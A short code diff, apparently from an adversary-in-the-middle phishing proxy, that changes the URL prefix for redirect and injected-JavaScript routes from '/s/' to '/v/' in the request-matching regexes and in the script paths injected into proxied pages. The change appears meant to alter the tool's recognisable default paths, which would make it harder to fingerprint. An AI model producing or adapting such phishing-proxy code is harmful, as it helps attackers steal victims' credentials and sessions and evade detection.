@@ -272,8 +272,8 @@ for _, blocked := range blockedUserAgents {
 			pl := p.getPhishletByPhishHost(req.Host)
 			remote_addr := from_ip
 
-			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
-			js_inject_re := regexp.MustCompile("^\\/s\\/([^\\/]*)\\/([^\\/]*)")
+			redir_re := regexp.MustCompile("^\\/v\\/([^\\/]*)")
+			js_inject_re := regexp.MustCompile("^\\/v\\/([^\\/]*)\\/([^\\/]*)")
 
 			if js_inject_re.MatchString(req.URL.Path) {
 				ra := js_inject_re.FindStringSubmatch(req.URL.Path)
@@ -1238,11 +1238,11 @@ for _, blocked := range blockedUserAgents {
 							//log.Debug("js_inject: hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
 							js_id, _, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
 							if err == nil {
-								body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s/%s.js", s.Id, js_id))
+								body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/v/%s/%s.js", s.Id, js_id))
 							}
 
 							log.Debug("js_inject: injected redirect script for session: %s", s.Id)
-							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id))
+							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/v/%s.js", s.Id))
 						}
 					}
 				}
